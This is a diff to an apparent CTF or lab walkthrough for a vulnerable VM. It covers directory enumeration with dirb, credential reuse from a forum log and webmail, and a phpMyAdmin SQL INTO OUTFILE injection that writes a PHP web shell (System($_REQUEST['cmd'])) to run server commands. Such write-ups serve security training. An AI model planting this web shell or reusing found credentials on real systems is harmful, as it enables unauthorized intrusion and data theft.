@@ -15,12 +15,12 @@ We need to understand what exactly we are going to "hack".
       ![web_page](screens/web_page.jpg)
       
 ### 4. Now we can use DIRB - scaner of the web content which can find possibly hidden information of the page using it's library:<br/>
-   4.1 `./dirb http://192.168.12.128 wordlist/common.txt -w`<br/>
+   * `./dirb http://192.168.12.128 wordlist/common.txt -w`<br/>
        output gives us a possibility to see the "forum" folder and some other which are not really relevant:<br/>
        ![dirb](screens/dirb.jpg)<br/>
        Though http://192.168.12.128/forum not found in browser
 
-   4.2 lets try ssl version of the site<br/>
+   * lets try ssl version of the site<br/>
        `./dirb http://192.168.12.128 wordlist/common.txt -w`<br/>
        and we get much more info now, but there are few main folders:<br/>
        ![dirb_https](screens/dirb_https.jpg)<br/>
@@ -29,12 +29,11 @@ We need to understand what exactly we are going to "hack".
        https://192.168.12.128/phpmyadmin<br/>
 
 ### 5. First checking out the "forum" folder, proceeding in the browser to https://192.168.12.128/forum <br/>
-   5.1 We see few topics, checking first one with login problem, looks like the log outpit of log in attempts, one line contains some symbols that are looking like a password:<br/>
-       
+   * We see few topics, checking first one with login problem, looks like the log outpit of log in attempts, one line contains some symbols that are looking like a password:<br/>   
    ![forum_log_pass](screens/forum_log_pass.jpg)<br/>
    assuming that it was log in try we can think that it's user password, probably the one who created the topic<br/>
    
-   5.2 Log in functionality is present on a forum, as well as users tab:<br/>
+   * Log in functionality is present on a forum, as well as users tab:<br/>
    ![users](screens/forum_users.jpg)<br/>
    there are not so much users, so we going to try to login with credentials of them and this password that we have<br/>
    the try to login with lmezard and password that we've found was successfull<br/>
@@ -42,22 +41,22 @@ We need to understand what exactly we are going to "hack".
    Keep in mind that we have access to the "webmail" page and we see the email of the user
        
 ### 6. Going to check the webmail page
-   6.1 trying if user email that we found and password that we used to login are matching, seems it works<br/>
+   * trying if user email that we found and password that we used to login are matching, seems it works<br/>
    ![web_mailer](screens/web_mailer.jpg)<br/>
-   6.2 inbox contains 2 emails, one is very interesting, but another one contains root DB access, which seems more relevant to us necause we remember that we have "phpmyadmin" page on a site<br/>
+   * inbox contains 2 emails, one is very interesting, but another one contains root DB access, which seems more relevant to us necause we remember that we have "phpmyadmin" page on a site<br/>
    ![inbox](screens/inbox.jpg)<br/>
    ![db_access_mail](screens/db_access_mail.jpg)<br/>
 
 ### 7. phpmyadmin investigation
-   7.1 lets try to login with credentials that we've got<br/>
-   7.2 using suggestions from this topic http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2 we are going to inject php file that allows us to run a shell commands from browser<br/>
-   During several attemtps of the injection files into different known folders that exist on the site, we were finally able to make a needed injection into the "temaplates_c" folder<br/>
+   * lets try to login with credentials that we've got<br/>
+   * using suggestions from this topic http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2 we are going to inject php file that allows us to run a shell commands from browser<br/>
+   * During several attemtps of the injection files into different known folders that exist on the site, we were finally able to make a needed injection into the "temaplates_c" folder<br/>
     `SELECT "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php";`<br/>
     ![db_injection](screens/db_injection.jpg)<br/>
 ### 8. thanks to the tutorial we can now use shell commands of the server from the browser 
-   8.1 which gives us the possibility to find credentials to access the server found in password file in LOOKATME folder<br/>
-   ![bash_in_browser](screens/bash_through_browser.jpg)<br/>
-   8.2 looks like an ssh or ftp access <br/>
+   * which gives us the possibility to find credentials to access the server found in password file in LOOKATME folder<br/>
+   ![bash_in_browser](screens/bash_trough_browser.jpg)<br/>
+   * looks like an ssh or ftp access <br/>
    ![lmezard_password](screens/lmezard_password.jpg)<br/>
    
 ### 9.     the ssh try
